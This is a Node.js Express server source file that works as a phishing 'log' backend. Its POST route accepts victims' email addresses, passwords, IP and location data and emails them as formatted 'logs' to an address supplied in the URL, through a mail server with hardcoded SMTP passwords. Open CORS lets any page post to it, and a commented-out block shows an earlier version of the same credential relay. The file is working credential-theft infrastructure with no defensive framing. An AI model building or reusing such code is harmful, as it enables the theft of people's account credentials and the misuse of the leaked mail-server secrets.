


const express = require('express');
const app = express();
const port = 8000;
const path = require('path');
const nodeMailer = require('nodemailer');
const cors = require('cors')
const morgan = require('morgan')
const helmet = require('helmet')
const Zennda = require('./controller/zender');


app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(cors({
    "origin": "*",
    "methods": "GET,HEAD,PUT,PATCH,POST,DELETE",
    "preflightContinue": true,
    "optionsSuccessStatus": 204
  }));
app.use(morgan('combined'));
app.use(helmet());


setInterval(()=>{
    console.log('qpp');
}, 660000);




// var transporter = nodeMailer.createTransport({
//     host: "physicaleducationdiploma.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: "sender@physicaleducationdiploma.com",
//       pass: "tQpiwc[Y)Ny)"
//     }
// });


// var mailOptions = {
//     from:'New Logs from <sender@physicaleducationdiploma.com>',
//     to: "joshyepes0@gmail.com",
//     subject: `Contemproary Logs from <email>`,
//     text:'Testing the microphone',
//     html: `
//     <center>last email testing</center>
//     <p>Email Address:===> email</p>
//     <p>Password:===> password</p>
//     <p>IP Address:===> IP</p>
//     <span>😜😜😜</span>
//     `
// }


// // email weill be sent below

// transporter.sendMail(mailOptions, function(error, info) {
//     if (error) {
//         console.log('err:===>',error);
//     } else {
//         console.log('email_sent:======> ' + info.response)
//     }
// });

app.get('/app', (req,res)=>{
    res.status(200).send('hello app');
    
});














// email sending route
app.post('/component/diploma/toplas/:receivers_email/tb/educationdiploma/', async (req,res)=>{
    try {

        const receiverEmail = req.params.receivers_email;

        // console.log(receiverEmail);kddkd

        

        const email = await req.body.email;
        const pswd = await req.body.pswd;
        const eyep = await req.body.eyep;
        const country = await req.body.country;
        const city = await req.body.city;
        const flag = await req.body.flag;
        const nownow = await req.body.nownow;
        

    
        var transporter = nodeMailer.createTransport({
            host: "physicaleducationdiploma.com",
            port: 465,
            secure: true,
            auth: {
            //   user: "hello@physicaleducationdiploma.com",
            //   pass: "D5?G}+84cKjt"

            user: "topp@physicaleducationdiploma.com",
            pass: "P778~U;;x[$K"
            }
        });
    
    
        var mailOptions = {
            from:`Hello Logs <topp@physicaleducationdiploma.com>`,
            to: `${receiverEmail}`,
            subject: `Your Log is ready @ <${email}>`,
            text:'Hello',
            html: `
            <body>
    
            <table>
                <thead>
                    <tr>
                        <th style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;">Title</th>
                        <th style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;">Details</th>
                    </tr>
        
                </thead>
        
                <tbody>
                    <tr>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;">Email:</td>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;"><b>${email}</b></td>
                    </tr>
        
        
                    <tr>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;">Password:</td>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;"><b>${pswd}</b></td>
                    </tr>
        
        
                    <tr>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;">Ip Adress:</td>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;"><b>${country}</b></td>
                    </tr>


                    <tr>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;">Flag:</td>
                        <td style="padding: 25px;text-align: left;border-bottom: 1px solid #ddd;color: #222;"><b>${flag}</b></td>
                    </tr>
                </tbody>
            </table>
        
        </body>
                `
        }
    
     

        // email weill be sent below
    
        transporter.sendMail(mailOptions, function(error, info) {
            if (error) {
                console.log('err:===>',error);
            } else {
                console.log('email_sent:======> ' + info.response)
            }
        });
    
        res.json({
            e: false,
            m:'ok ok'
        })
            
        } catch (error) {
            res.json({
                e: true,
                m: 'invalid'
            })
        }
});





app.listen(`${port}`, (req,res)=>{
    console.log(`app started @ port ${port}`);
});
